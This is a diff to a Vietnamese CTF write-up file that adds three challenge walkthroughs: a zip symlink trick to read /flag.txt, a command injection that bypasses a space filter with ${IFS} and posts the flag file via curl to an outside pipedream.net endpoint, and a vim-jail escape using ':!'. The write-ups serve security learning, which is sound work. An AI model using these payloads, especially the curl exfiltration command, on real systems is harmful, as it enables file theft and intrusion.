@@ -38,6 +38,9 @@
 - [Baby Waiter](#baby-waiter)
 - [Ping 0x02](#ping-0x02)
 - [Todo Application](#todo-application)
+- [Unzip me now](#unzip-me-now)
+- [The Existed File](#the-existed-file)
+- [Break The Editor Jail](#break-the-editor-jail)
 
 
 ## Baby Address Note
@@ -470,4 +473,30 @@ if($ip === '127.0.0.1' || $ip === '::1') echo "FLAG_HERE";
 6. Cuối cùng đọc file flag.
 ![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/ad08816d-6baa-44cd-a22e-1378e52f5735)
 
-## 
+## Unzip me now
+
+1. Ở bài này ta sẽ sử dụng một kỹ thuật gọi là zip symlink ngoài ra với những bài upload zip có thể tham khảo (zip slip, và zip symlink và cmdi).
+2. Về cơ chế thì chúng ta sẽ tạo một symlink tới một file. Khi đó symlink đó sẽ có được giá trị của file đó rồi khi mà có xóa file chính đi thì file link vẫn sẽ còn và chứa nội dung của nó.
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/371e1182-508d-47bf-9d15-9019bf0045c5)
+3. Thực hiện exploit:
+- B1: Tạo link tới file /flag.txt trên máy local
+``ln -s /flag.txt flag``
+- B2: Zip file link với option
+``zip --symlinks flag.zip flag``
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a3012b5d-3c7f-4c97-bcc8-f8f21e889a6f)
+
+## The Existed File
+
+1. Nhận thấy bài này là command injection. Từ source code có thể thấy các từ trong blacklist. (Ngoài ra nó còn filter space)
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/2a49e15b-d80e-4d7e-9bcd-299fef5c0553)
+2. Trong blacklist có char `$` chưa bị filter. Thử với payload `$(whoami)` thì không được. (maybe blind)
+3. Nghĩ đến phương án post data file via curl. Payload: ``$(curl${IFS}-d${IFS}@/flag.txt${IFS}https://eonnlyuk1evzal4.m.pipedream.net`` (Sử dụng ${ISP} để bypass filter space)
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/067a6b27-a61b-4569-943c-2bbff4a37a4e)
+
+## Break The Editor Jail
+
+1. Trang này giả lập vim editor
+2. Để thực thi command trong vi ta có thể sử dụng ``:!ls``
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/c6c6664a-a04b-471b-ae61-0d21fdcc7645)
+3. Đọc flag với ``:!cat flag.txt``
+
